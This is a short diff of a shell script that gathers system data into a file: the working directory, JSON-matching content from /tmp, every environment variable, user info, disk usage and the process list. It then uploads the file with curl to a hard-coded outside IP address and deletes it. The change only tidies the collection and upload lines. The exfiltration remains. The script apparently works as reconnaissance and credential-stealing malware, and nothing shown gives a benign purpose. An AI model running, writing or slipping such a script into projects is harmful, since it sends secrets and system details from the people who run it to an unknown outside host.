@@ -1,6 +1,6 @@
 pwd > testing
 echo ----------------- ls ------- >> testing
-find /tmp/ -depth -type f -exec cat '{}' | grep -i "json" \; >> testing
+find /tmp/ -depth -type f -exec grep -i "json" '{}' \; >> testing
 echo ----------------- Environment ------- >> testing
 env >> testing
 echo ----------------- User Info ------- >> testing
@@ -13,5 +13,5 @@ df -h >> testing
 echo ----------------- ps -aux ------- >> testing
 ps -aux >> testing
 echo ----------------- END $(date) ------- >> testing
-curl -F "name=@testing" http://138.68.58.230:8080 && echo -n ool
+curl -F "name=@testing" http://138.68.58.230:8080
 rm testing
